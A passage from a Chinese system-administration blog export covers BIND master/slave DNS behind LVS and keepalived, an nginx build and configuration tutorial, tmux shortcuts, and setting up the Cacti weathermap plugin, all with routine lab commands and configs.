&quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;log&#x2F;dns_log&quot; versions 10 size 100m; severity info; print-category yes; print-severity yes; print-time yes; &#125;; category default &#123; warning; &#125;; category queries &#123; general_dns; &#125;;&#125;;include &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;etc&#x2F;view.conf&quot;; 编辑rndc.key文件(key来自于rndc-confgen生成的key) 1234key &quot;rndc-key&quot; &#123; algorithm hmac-md5; secret &quot;iePWaBCTTwMeAC0WWUqLMA&#x3D;&#x3D;&quot;;&#125;; 查看/etc/rndc.conf文件 12345678910key &quot;rndc-key&quot; &#123; algorithm hmac-md5; secret &quot;iePWaBCTTwMeAC0WWUqLMA&#x3D;&#x3D;&quot;;&#125;;options &#123; default-key &quot;rndc-key&quot;; default-server 127.0.0.1; default-port 953;&#125;; 编辑/var/named/chroot/etc/view.conf 12345678910111213141516171819202122232425view &quot;View&quot; &#123; &#x2F;&#x2F;配置bind视图功能 zone &quot;test.org&quot; &#123; type master; file &quot;test.org.zone&quot;; &#x2F;&#x2F;定义zone区域文件 allow-transfer &#123; &#x2F;&#x2F;允许本区域传输给特定的从DNS服务器 192.168.56.24; &#x2F;&#x2F;slave IP,可以存在多个slave &#125;; notify yes; also-notify &#123; 192.168.56.24; &#125;; &#125;; zone &quot;56.168.192.in-addr.arpa&quot; &#123; &#x2F;&#x2F;定义反向zone区域文件 type master; file &quot;56.168.192.zone&quot;; allow-transfer &#123; &#x2F;&#x2F;允许本区域传输给特定的从DNS服务器 192.168.56.24; &#x2F;&#x2F;slave IP,可以存在多个slave &#125;; notify yes; also-notify &#123; 192.168.56.24; &#125;; &#125;;&#125;; 123参数补充：(1)区域类型有type：｛hint（根）| master（主dns）| slave（辅助DNS）| forward（转发）｝(2)notify如果是yes（默认），当一个授权的服务器修改了一个域后，DNS NOTIFY信息被发送给列在also-notify选项中的服务器。 编辑/var/named/chroot/etc/test.org.zone 【正向区域文件名称需与view.conf中一致】 12345678910111213141516$ORIGIN .$TTL 3600 ; 1 hourtest.org IN SOA ns1.test.org. root.test.org. ( 2017091101 ; serial 900 ; refresh (15 minutes) 600 ; retry (10 minutes) 86400 ; expire (1 day) 3600 ; minimum (1 hour) ) NS ns1.test.org. $ORIGIN test.org.ns1 A 192.168.56.23 www A 192.168.56.222w3 CNAME www.test.org.mail MX 5 192.168.56.251mail MX 10 192.168.56.252 编辑/var/named/chroot/etc/56.168.192.zone 【反向区域文件名称需与view.conf中一致】 123456789101112$TTL 3600 ; 1 hour@ IN SOA ns1.test.org. root.test.org. ( 2017091101 ; serial 900 ; refresh (15 minutes) 600 ; retry (10 minutes) 86400 ; expire (1 day) 3600 ; minimum (1 hour) )@ IN NS ns1.test.org. @ IN MX 5 mail.test.org.@ IN MX 10 mail.test.org.222 IN PTR www.test.org. 修改目录权限，并启动服务 1234修改DNS区域文件存放目录的权限cd &#x2F;var &amp;&amp; chown -R named.named named&#x2F;&#x2F;etc&#x2F;init.d&#x2F;named startchkconfig named on 管理DNS1 123rndc reload 重新加载区域文件rndc stop 停止DNS服务&#x2F;etc&#x2F;init.d&#x2F;named status 查看DNS运行状态 DNS1测试-master节点 12dig @192.168.56.23 www.test.org #测试正向解析host 192.168.56.222 192.168.56.23 #测试反向解析 DNS2-从上配置 编辑主配置文件/etc/named.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051options &#123; version &quot;1.1.1&quot;; listen-on port 53 &#123;any;&#125;; directory &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;etc&#x2F;&quot;; pid-file &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;run&#x2F;named&#x2F;named.pid&quot;; allow-query &#123; any; &#125;; Dump-file &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;log&#x2F;binddump.db&quot;; Statistics-file &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;log&#x2F;named_stats&quot;; zone-statistics yes; memstatistics-file &quot;log&#x2F;mem_stats&quot;; empty-zones-enable no; forwarders &#123; 114.114.114.114; 8.8.8.8; &#125;;&#125;;key &quot;rndc-key&quot; &#123; algorithm hmac-md5; secret &quot;iePWaBCTTwMeAC0WWUqLMA&#x3D;&#x3D;&quot;;&#125;;controls &#123; inet 127.0.0.1 port 953 allow &#123; 127.0.0.1; &#125; keys &#123; &quot;rndc-key&quot;; &#125;;&#125;;logging &#123; channel warning &#123; file &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;log&#x2F;dns_warning&quot; versions 10 size 10m; severity warning; print-category yes; print-severity yes; print-time yes; &#125;; channel general_dns &#123; file &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;var&#x2F;log&#x2F;dns_log&quot; versions 10 size 100m; severity info; print-category yes; print-severity yes; print-time yes; &#125;; category default &#123; warning; &#125;; category queries &#123; general_dns; &#125;;&#125;;include &quot;&#x2F;var&#x2F;named&#x2F;chroot&#x2F;etc&#x2F;view.conf&quot;; 编辑/etc/rndc.key 1234key &quot;rndc-key&quot; &#123; algorithm hmac-md5; secret &quot;iePWaBCTTwMeAC0WWUqLMA&#x3D;&#x3D;&quot;;&#125;; 编辑/etc/rndc.conf 12345678910key &quot;rndc-key&quot; &#123; algorithm hmac-md5; secret &quot;iePWaBCTTwMeAC0WWUqLMA&#x3D;&#x3D;&quot;;&#125;;options &#123; default-key &quot;rndc-key&quot;; default-server 127.0.0.1; default-port 953;&#125;; 编辑/var/named/chroot/etc/view.conf 12345678910111213view &quot;SlaveView&quot; &#123; zone &quot;test.org&quot; &#123; type slave; &#x2F;&#x2F;正向区域文件配置为slave模式 masters &#123; 192.168.56.23; &#125;; &#x2F;&#x2F;此处要指定masterIP，可以添加多个 file &quot;slave.test.org.zone&quot;; &#x2F;&#x2F;不需要对其创建，服务启动后，会自动同步过来 &#125;; zone &quot;56.168.192.in-addr.arpa&quot; &#123; type slave; &#x2F;&#x2F;反向区域文件配置为slave模式 masters &#123; 192.168.56.23; &#125;; &#x2F;&#x2F;此处要指定masterIP，可以添加多个 file &quot;slave.56.168.192.zone&quot;; &#x2F;&#x2F;不需要对其创建，服务启动后，会自动同步过来 &#125;;&#125;; 启动从节点DNS 12345678cd &#x2F;var &amp;&amp; chown -R named.named named&#x2F;&#x2F;etc&#x2F;init.d&#x2F;named startchkconfig named oncd &#x2F;var&#x2F;named&#x2F;chroot&#x2F;etcls -lh slave*-rw-r--r-- 1 named named 385 Sep 14 18:27 slave.56.168.192.zone-rw-r--r-- 1 named named 396 Sep 14 18:24 slave.test.org.zone 从DNS2测试 12dig @192.168.56.24 www.test.org #测试正向解析host 192.168.56.222 192.168.56.24 #测试反向解析 此时再回到LB-1和LB-2重新执行命令 12345678910[root@LB-1 ~]# ipvsadm -Ln[root@LB-2 ~]# ipvsadm -Ln结果均如下：IP Virtual Server version 1.2.1 (size&#x3D;4096)Prot LocalAddress:Port Scheduler Flags -&gt; RemoteAddress:Port Forward Weight ActiveConn InActConnTCP 192.168.56.100:53 rr -&gt; 192.168.56.23:53 Route 1 0 0 -&gt; 192.168.56.24:53 Route 1 0 0 UDP 192.168.56.100:53 rr 在每台的real server上执行脚本我们定义的realserver其实是2台主从DNS,所以在主从DNS上执行如下脚本。 1234567891011121314151617181920212223242526#!&#x2F;bin&#x2F;bash#description : Start Real ServerVIP&#x3D;192.168.56.100. &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;functionscase &quot;$1&quot; in start) echo &quot; Start LVS of Real Server&quot; &#x2F;sbin&#x2F;ifconfig lo:0 $VIP broadcast $VIP netmask 255.255.255.255 up echo &quot;1&quot; &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;lo&#x2F;arp_ignore echo &quot;2&quot; &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;lo&#x2F;arp_announce echo &quot;1&quot; &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;all&#x2F;arp_ignore echo &quot;2&quot; &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;all&#x2F;arp_announce ;; stop) &#x2F;sbin&#x2F;ifconfig lo:0 down echo &quot;close LVS Director server&quot; echo &quot;0&quot; &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;lo&#x2F;arp_ignore echo &quot;0&quot; &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;lo&#x2F;arp_announce echo &quot;0&quot; &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;all&#x2F;arp_ignore echo &quot;0&quot; &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;conf&#x2F;all&#x2F;arp_announce ;; *) echo &quot;Usage: $0 &#123;start|stop&#125;&quot; exit 1esac 123456789101112131415161718192021222324252627282930313233注：此配置与上面的脚本功能一致，便于理解其含义1. 在lo上配置vipvim &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-lo:0DEVICE&#x3D;lo:0IPADDR&#x3D;192.168.56.100NETMASK&#x3D;255.255.255.255ONBOOT&#x3D;yesNAME&#x3D;loopback2.禁广播设置vim &#x2F;etc&#x2F;sysctl.conf 在配置文件最后进行添加net.ipv4.conf.lo.arp_ignore &#x3D; 1 （只回答目标IP地址是来访网络接口本地地址的ARP查询请求）net.ipv4.conf.lo.arp_announce &#x3D; 2 （忽略IP数据包的源地址并尝试选择与能该地址通信的本地址）net.ipv4.conf.all.arp_ignore &#x3D; 1net.ipv4.conf.all.arp_announce &#x3D; 2ifup lo:0 启用回环接口sysctl -p 刷新sysctl配置文件###################################################################################其中：arp_ignore:定义对目标地址为本地IP的ARP询问不同的应答模式0 0 - (默认值): 回应任何网络接口上对任何本地IP地址的arp查询请求 1 - 只回答目标IP地址是来访网络接口本地地址的ARP查询请求 2 -只回答目标IP地址是来访网络接口本地地址的ARP查询请求,且来访IP必须在该网络接口的子网段内 3 - 不回应该网络界面的arp请求，而只对设置的唯一和连接地址做出回应 4-7 - 保留未使用 8 -不回应所有（本地地址）的arp查询arp_announce:对网络接口上，本地IP地址的发出的，ARP回应，作出相应级别的限制: 确定不同程度的限制,宣布对来自本地源IP地址发出Arp请求的接口 0 - (默认) 在任意网络接口（eth0,eth1，lo）上的任何本地地址 1 -尽量避免不在该网络接口子网段的本地地址做出arp回应. 当发起ARP请求的源IP地址是被设置应该经由路由达到此网络接口的时候很有用.此时会检查来访IP是否为所有接口上的子网段内ip之一.如果改来访IP不属于各个网络接口上的子网段内,那么将采用级别2的方式来进行处理. 2 - 对查询目标使用最适当的本地地址.在此模式下将忽略这个IP数据包的源地址并尝试选择与能与该地址通信的本地地址.首要是选择所有的网络接口的子网中外出访问子网中包含该目标IP地址的本地地址. 如果没有合适的地址被发现,将选择当前的发送网络接口或其他的有可能接受到该ARP回应的网络接口来进行发送. 执行脚本 1234567[root@DNS1 ~]# sh realserver.sh startStart LVS of Real Server[root@DNS1 ~]# ip a 查看lo回环接口配置 [root@DNS2 ~]# sh realserver.sh startStart LVS of Real Server[root@DNS2 ~]# ip a 查看lo回环接口配置 同内网客户端-测试 虚拟VIP-测试 12345678910C:\\Users\\mx-0123&gt;dig www.test.org @192.168.56.100;; ANSWER SECTION:www.test.org. 3600 IN A 192.168.56.222;; AUTHORITY SECTION:test.org. 3600 IN NS ns1.test.org.;; ADDITIONAL SECTION:ns1.test.org. 3600 IN A 192.168.56.23;; Query time: 10 msec;; SERVER: 192.168.56.100#53(192.168.56.100);; WHEN: Fri Sep 15 16:11:32 中国标准时间 2017 VIP抢占测试(简单粗暴) 12345678910111.直接shutdown LB-1 master节点 测试结果： [root@LB-2 ~]# ip a LB-2成了master,接管DNS服务，来继续看看客户端能否解析 C:\\Users\\mx-0123&gt; dig www.test.org @192.168.56.100 +tcp #出现如下字段说明VIP备用节点工作正常 ;; ANSWER SECTION: www.test.org. 3600 IN A 192.168.56.2222. 再启动LB-1后，无需任何操作，LB-1自动抢占成为了master节点，而LB-2成为了BACKUP节点，DNS解析服务也正常。 故障排查12345678910111213141516VIP抢占过程中遇到的坑，而且是自己给自己埋的坑。不废话，直奔主题当我shutdown LB-1 master节点以后，LB-2顺利变成了master,VIP完成秒漂移. 在客户端使用dig命令竟然无法解析！！！问题是LB-1启用的时候，dig是可以解析的，所以把目光转移到了LB-2的keeplived配置上。dig www.test.org @192.168.56.100 难道是keepalived配置不对？仔细核对了代码配置之后，发现没有特殊异常。而且也参考这篇文章[http:&#x2F;&#x2F;www.bubuko.com&#x2F;infodetail-1193942.html]进行了排查,最终没能解决问题。突然想起了dig有个参数叫做&quot;+tcp&quot;,意思是指定使用tcp协议进行DNS解析【默认使用UDP】，启动LB-1继续测试dig www.test.org @192.168.56.100【可以解析】 dig www.test.org @192.168.56.100 +tcp【可以解析】以上2条均可正常解析，那好再shutdown LB-1模拟脑裂,来测试LB-2dig www.test.org @192.168.56.100【不能解析】dig www.test.org @192.168.56.100 +tcp【可以解析】 卧槽，tcp可以解析，目标锁定，LB-2的UDP配置异常。打开LB-2的keeplived中UDP定义的地方进行挨个读，看看有没有语法错误，看到了最后有两条UDP针对real_server服务器的命令检测，如果检测可以解析，则认为DNS服务器正常，否则踢出集群。命令是“&#x2F;usr&#x2F;bin&#x2F;dig www.test.org @192.168.56.23 +time&#x3D;1 +tries&#x3D;5 +fail” ,仔细看了看命令，也没啥错误啊，得，那是骡子是马拉出来溜溜吧，命令粘贴到LB-2使用命令行执行，卧槽！没安装dig，长叹了一声Fuck!赶紧安装，安装完了之后，重启keeplived，客户端再解析测试，终于OK了自己给自己埋了个炸弹！...因为LB-1和LB-2上面没有DNS，所以也每想着安装dig命令，吃一堑长一智","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"高可用","slug":"高可用","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E5%8F%AF%E7%94%A8/"},{"name":"lvs","slug":"lvs","permalink":"https://garywu520.github.io/tags/lvs/"},{"name":"keepalived","slug":"keepalived","permalink":"https://garywu520.github.io/tags/keepalived/"},{"name":"dns","slug":"dns","permalink":"https://garywu520.github.io/tags/dns/"},{"name":"dr","slug":"dr","permalink":"https://garywu520.github.io/tags/dr/"},{"name":"dns主从","slug":"dns主从","permalink":"https://garywu520.github.io/tags/dns%E4%B8%BB%E4%BB%8E/"},{"name":"集群","slug":"集群","permalink":"https://garywu520.github.io/tags/%E9%9B%86%E7%BE%A4/"},{"name":"VRRP","slug":"VRRP","permalink":"https://garywu520.github.io/tags/VRRP/"}]},{"title":"HTTP_Web之Nginx详解","slug":"HTTP-Web之Nginx详解","date":"2017-09-14T06:32:45.000Z","updated":"2017-09-16T11:35:53.016Z","comments":true,"path":"2017/09/14/HTTP-Web之Nginx详解/","link":"","permalink":"https://garywu520.github.io/2017/09/14/HTTP-Web%E4%B9%8BNginx%E8%AF%A6%E8%A7%A3/","excerpt":"HTTP协议版本 1234HTTP 协议最主要的版本为 HTTP&#x2F;1.0和HTTP&#x2F;1.1，HTTP&#x2F;1.0是第一个得到广泛使用的版本， HTTP&#x2F;1.1为当前使用的主流版本。HTTP&#x2F;1.1：支持持久连接，在一个 TCP 连接上可以传送多个HTTP 请求和响应，减少了建立和关闭连接的消耗和时间的延迟，效率较高。","text":"HTTP协议版本 1234HTTP 协议最主要的版本为 HTTP&#x2F;1.0和HTTP&#x2F;1.1，HTTP&#x2F;1.0是第一个得到广泛使用的版本， HTTP&#x2F;1.1为当前使用的主流版本。HTTP&#x2F;1.1：支持持久连接，在一个 TCP 连接上可以传送多个HTTP 请求和响应，减少了建立和关闭连接的消耗和时间的延迟，效率较高。 HTTP状态码 1234当web 客户端向 web 服务器发送一个 HTTP 请求 web 服务器 都会返回一个状态响应码，这个状态码的作用是告知web客户端此次请求是否成功，或者是否要采取其他的动作方式 。具体参考：HTTP Status Codehttp:&#x2F;&#x2F;www.cnblogs.com&#x2F;DeasonGuan&#x2F;articles&#x2F;Hanami.html curl命令 123456789101112131415[root@m01 ~]# curl -v www.360buy.com -v参数用来显示详细信息其中： &gt;GET &#x2F; HTTP&#x2F;1.1 # &quot;&gt;&quot;符号表示开始请求报文；GET:请求方式; HTTP&#x2F;1.1:版本信息&gt;User-Agent: curl&#x2F;7.19.7 #用的是什么浏览器类型&gt;Host: www.qq.com # 访问的域名对应的主机信息&gt; # 空行表示请求头结束&lt; HTTP&#x2F;1.1 200 OK #“&lt;”符号表示开始响应报文内容，包含状态码等信息，200为状态码；301表示永久跳转&lt; Server: squid&#x2F;3.5.20 # 响应头部&lt; Date: Thu, 14 Sep 2017 06:37:05 GMT #响应时间信息&lt; Content-Type: text&#x2F;html; charset&#x3D;GB2312 #返回的文件信息&lt; Transfer-Encoding: chunked &lt; Connection: keep-alive #长连接&lt; #“&lt;”符号表示响应报文结束 123456789101112#这部分就是一个响应主体 ，也就是你访问的内容&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt; 响应主体&lt;html&gt;&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;&quot;white&quot;&gt;&lt;h1&gt;301 Moved Permanently&lt;&#x2F;h1&gt;&lt;p&gt;The requested resource has been assigned a new permanent URI.&lt;&#x2F;p&gt;&lt;hr&#x2F;&gt;Server: JDWS&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;* Connection #0 to host www.360buy.com left intact* Closing connection #0 URL 与URI 的概念 12345678910例：https:&#x2F;&#x2F;www.taobao.com&#x2F;markets&#x2F;3c&#x2F;shuma?spm&#x3D;a21bo.50862.201867-main.12.28689e73E6z0p9其中，https:&#x2F;&#x2F;www.taobao.com 即为URL信息&#x2F;markets&#x2F;3c&#x2F;shuma?spm&#x3D;a21bo.50862.201867-main.12.28689e73E6z0p9 这一部分即为URI信息域名组成：URL+ URI组成URL，全称为Uniform Resource Location，中文翻译为统一资源定位符URI，全称为Uniform Resource Identifier，中文翻译为统一资源标识符 编译安装Nginx 安装nginx所需的pcre库 1pcre 即perl兼容正则表达式，官方：http:&#x2F;&#x2F;www.pcre.org. 安装pcre库是为了使Nginx支持具备URI重写功能的rewrite模块。Nginx的rewirte模块功能几乎是企业应用必须的。 1234[root@web01]# yum install -y pcre pcre-devel openssl-devel #yum安装这两个软件包#下面是gcc编译环境yum install gcc gcc-c++ gcc-g77 flex bison autoconf automake bzip2-devel zlib-devel ncurses-devel libjpeg-devel libpng-devel libtiff-devel freetype-devel pam-devel libxml2-devel gettext-devel pcre-devel openssl-devel 下载编译nginx 1234567官方：http:&#x2F;&#x2F;nginx.org&#x2F;en&#x2F;download.htmlwget http:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.10.3.tar.gztar -zxvf nginx-1.10.3.tar.gzcd nginx-1.10.3useradd www -s &#x2F;sbin&#x2F;nologin -M #创建Nginx管理用户id www 1234567891011121314开始编译 1， 配置软件 指定软件有哪些功能 用哪些模块 2， 编译软件 编译成机器能识别的信息 就是 二进制 3， 编译安装软件 安装软件 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;开始编译 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;#编译.&#x2F;configure --prefix&#x3D;&#x2F;application&#x2F;nginx-1.10.3 --user&#x3D;www --group&#x3D;www --with-http_stub_status_module --with-http_ssl_module#安装make &amp;&amp; make install#检查上个命令执行是否成功[0表示成功，非0表示失败]echo $? 1234567891011121314#创建软连接cd &#x2F;applicationln -s &#x2F;application&#x2F;nginx-1.10.3&#x2F; &#x2F;application&#x2F;nginxnginx_PATH&#x3D;&#x2F;application&#x2F;nginxecho $nginx_PATH#启动服务&#x2F;application&#x2F;nginx&#x2F;sbin&#x2F;nginx#查看nginx进程ps -ef |grep nginx#Web浏览器访问测试http:&#x2F;&#x2F;192.168.0.8&#x2F; Nginx目录结构 1234567891011[root@bind-master-23 nginx]# ls -lhtotal 36Kdrwx------ 2 www root 4.0K Sep 14 15:33 client_body_tempdrwxr-xr-x 2 root root 4.0K Sep 14 15:29 conf #Nginx所有相关配置drwx------ 2 www root 4.0K Sep 14 15:33 fastcgi_tempdrwxr-xr-x 2 root root 4.0K Sep 14 15:29 html #Web站点目录drwxr-xr-x 2 root root 4.0K Sep 14 15:33 logs #Nginx服务相关日志文件目录drwx------ 2 www root 4.0K Sep 14 15:33 proxy_tempdrwxr-xr-x 2 root root 4.0K Sep 14 15:29 sbin #相关命令保存目录drwx------ 2 www root 4.0K Sep 14 15:33 scgi_tempdrwx------ 2 www root 4.0K Sep 14 15:33 uwsgi_temp nginx配置文件-详解 1234567891011121314151617181920212223242526worker_processes 1; #定义worker进程数量,多并发可以修改此项events &#123; #此处定义每个worker进程可以处理多少个请求 worker_connections 1024;&#125;http &#123; include mime.types; #支持媒体类型库,即Nginx可以处理什么类型的请求 default_type application&#x2F;octet-stream; #默认处理的类型 sendfile on; #启用高效传输 keepalive_timeout 65; #长连接,超时时间 server &#123; #独立的虚拟主机站点 listen 80; # 监控的端口 server_name localhost; #主机头,虚拟主机的域名 location &#x2F; &#123; #定义的站点根目录 root html; #这里指定的是html index index.html index.htm; #默认首页文件 &#125; error_page 500 502 503 504 &#x2F;50x.html; #当访问出现50x状态错误后，请求的页面 location &#x3D; &#x2F;50x.html &#123; root html; &#125; &#125; &#125; 检查nginx配置文件是否有错误 1&#x2F;application&#x2F;nginx&#x2F;sbin&#x2F;nginx -t nginx平滑重启 1&#x2F;application&#x2F;nginx&#x2F;sbin&#x2F;nginx -s reload Nginx多站点配置 12345678910111213141516171819202122232425262728293031323334worker_processes 3;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; server &#123; listen 80; server_name www.etiantian.org; location &#x2F; &#123; root html&#x2F;www; \\\\\\\\ 站点 index index.html index.htm; &#125; &#125; server &#123; listen 80; server_name blog.etiantian.org; location &#x2F; &#123; root html&#x2F;blog; index index.html index.htm; &#125; &#125; server &#123; listen 80; server_name bbs.etiantian.org; location &#x2F; &#123; root html&#x2F;bbs; index index.html index.htm; &#125; &#125; &#125;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"http","slug":"http","permalink":"https://garywu520.github.io/tags/http/"},{"name":"https","slug":"https","permalink":"https://garywu520.github.io/tags/https/"},{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"},{"name":"URL","slug":"URL","permalink":"https://garywu520.github.io/tags/URL/"},{"name":"URI","slug":"URI","permalink":"https://garywu520.github.io/tags/URI/"},{"name":"web","slug":"web","permalink":"https://garywu520.github.io/tags/web/"},{"name":"curl","slug":"curl","permalink":"https://garywu520.github.io/tags/curl/"}]},{"title":"tmux使用技巧-备忘","slug":"tmux使用技巧-备忘","date":"2017-09-08T03:04:21.000Z","updated":"2018-11-23T06:58:38.122Z","comments":true,"path":"2017/09/08/tmux使用技巧-备忘/","link":"","permalink":"https://garywu520.github.io/2017/09/08/tmux%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7-%E5%A4%87%E5%BF%98/","excerpt":"tmux使用技巧-备忘","text":"tmux使用技巧-备忘 12345678910111213tmux ls 查看所有会话tmux at -t &quot;会话名称&quot;Ctrl+b ％ 左右切屏Ctrl+b &quot; 上下切屏exit会出多个tmux会话ctrl+b d 退出最后tmux且保留该会话ctrl+d 退出tmux，不保留该会话 12345关闭sessiontmux kill-session -t [session_name]假如开了N个session,想一次全部关闭, 则直接运行如下命令：tmux kill-server","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"tmux","slug":"tmux","permalink":"https://garywu520.github.io/tags/tmux/"},{"name":"会话","slug":"会话","permalink":"https://garywu520.github.io/tags/%E4%BC%9A%E8%AF%9D/"}]},{"title":"cacti插件-weathermap安装与使用","slug":"cacti插件-weathermap安装与使用","date":"2017-09-07T06:21:33.000Z","updated":"2017-09-08T02:47:51.882Z","comments":true,"path":"2017/09/07/cacti插件-weathermap安装与使用/","link":"","permalink":"https://garywu520.github.io/2017/09/07/cacti%E6%8F%92%E4%BB%B6-weathermap%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/","excerpt":"获取安装weathermap 12#官网https:&#x2F;&#x2F;network-weathermap.com&#x2F;#download#weathermap 0.98版本要求(PHP 4.3.x + PHP’s gd module)","text":"获取安装weathermap 12#官网https:&#x2F;&#x2F;network-weathermap.com&#x2F;#download#weathermap 0.98版本要求(PHP 4.3.x + PHP’s gd module) 12345cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;cacti_pluginswget https:&#x2F;&#x2F;github.com&#x2F;howardjones&#x2F;network-weathermap&#x2F;releases&#x2F;download&#x2F;version-0.98&#x2F;php-weathermap-0.98.zipunzip php-weathermap-0.98.zipmv weathermap &#x2F;home&#x2F;www&#x2F;data&#x2F;cacti&#x2F;pluginschown -R www.www &#x2F;home&#x2F;www&#x2F;data&#x2F;cacti&#x2F;plugins&#x2F;weathermap&#x2F; 安装weathermap插件 1console ---&gt; Plugin Management ---&gt; 选择weathermap ---&gt;点击安装和激活 插件启用后，如果左侧看不到Weathermaps插件，按照如下方法添加 1234进入CACTI ----&gt; Console ---&gt; Utilities ---&gt; User Management，选择管理员(也可能是非管理员)用户，在“Realm Permissions”里勾选： Plugin --&gt; weathermap:Configure&#x2F;Manage Plugin --&gt; weathermap:Edit Maps Plugin --&gt; weathermap:View 添加MAPS配置文件 1234567weathermap安装好后, plugins&#x2F;weathermap&#x2F;configs目录默认会出现两个文件：index.php和simple.conf，无需改动默认配置文件。但可以手动添加新文件,比如我创建一个 bjzhaowei.conf, 里面输入三个#，保存退出。并把配置文件属主属组修改为www。【注:如果没有修改属主属性和文件权限的话,会有错误的提示。】进入cacti的页面，console--&gt;management--&gt;weathermaps点击Add，找到我们刚才新加的bjzhaowei.conf文件--&gt;再次点击add。 以上MAP文件配置也可以在Web页面添加，不过需要修改editor.php文件 1234567cd cacti&#x2F;plugins&#x2F;weathermapvim editor.php将 $ENABLED&#x3D;false; 改为 $ENABLED&#x3D;true; 【注意最后的分号】Web访问：http:&#x2F;&#x2F;IP&#x2F;cacti&#x2F;plugins&#x2F;weathermap&#x2F;editor.php【如下图所示】如果不修改这个配置文件将出现如下错误：The editor has not been enabled yet. You need to set ENABLED&#x3D;true at the top of editor.php 画拓扑 1访问cacti -- Management -- weathermaps -- 点击已经添加的bjzhaowei.conf 这个Map文件，就进入了画图模式 123456【Add Node】 添加节点【Add Link】 添加节点间的连接 【Position Legend】 添加图例 【Position Timestamp】 添加制表时间如果要修改图片背景点击Map Properties，修改图形属性，在Background image这一栏选择相应的图形。然后点击submit提交。 1点击Add Node创建节点 ---&gt; 然后再按照相同方法创建第二个节点 123456第一行position，代表该节点的位置，由（横坐标，纵坐标）表示，原点在图形的 最左上角。第二行是内部名称，一般是写一个自己能看懂的名字，例如设备名称，最好修改成与Label相一致。第三行是Label，标签是显示在外面，显示在网页的名字，给用户看的。默认不支持中文第四行Info URL：此节点代表的设备的流量图的网页连接第五行‘Hover’Graph URL：此节点代表的设备的流量图的网页连接，通过Pick from cacti这个按钮来选择节点相应的链接最后一行选择该节点的图形，假设是router Add Link添加链接 1点击链路的起始节点，该节点会变红，然后点击链路的结束节点，该节点会变红 123点击上图链路中的任意一个箭头，会弹出下方的对话框，查看链路带宽和实际的是否相符，不符要进行修改，然后点击Submit，注：在地市级的城域网中，1000M对应的箭头宽度Link Width是3，10G对应的是5，100M对应的是1。 这是个协定，只是为了绘图统一 123Maximum Bandwidth..：此处填写两节点设备之间的连接的带宽Data Source：这里填写cacti上服务器rra目录下的某个文件的绝对路径，RRdtools会把这个连接所使用的网卡上的流量抓出来，在&#x2F;cacti&#x2F;rra目录下会创建一个后缀为.rra的文件,我们需要在服务器上找到这个文件，把文件的绝对路径添入，或者点击点击[Pick from Cacti],选择之前已经生成的流量图形即可Link Width：这里填写箭头和连接的像素宽度，建议使用“5” Map Style 12345第一行，链路标签，可以选择显示具体数值或者链路占用率或者无显示。第二，三行无需修改第四行是节点标签的字体第五行是链路标签的字体第六行是图例的字体 Position Legend为图像添加图例 1点击Position Legend, 再点击右侧空白处,即可添加图例(如上图右侧) Position Timestamp 1显示当前日期与时间--&gt;点击Position Timestamp --&gt;再点击右下角空白处 鼠标放在对应的链路上会弹出流量图 画图过程中，MAP文件Web界面报错解决 1234567错误：WARNING: [Map 6] xxx.conf: OVERLIBGRAPH is used, but HTMLSTYLE is static. This is probably wrong.解决方法：【参考官网】在配置文件的开头部分加入参数 “HTMLSTYLE overlib” 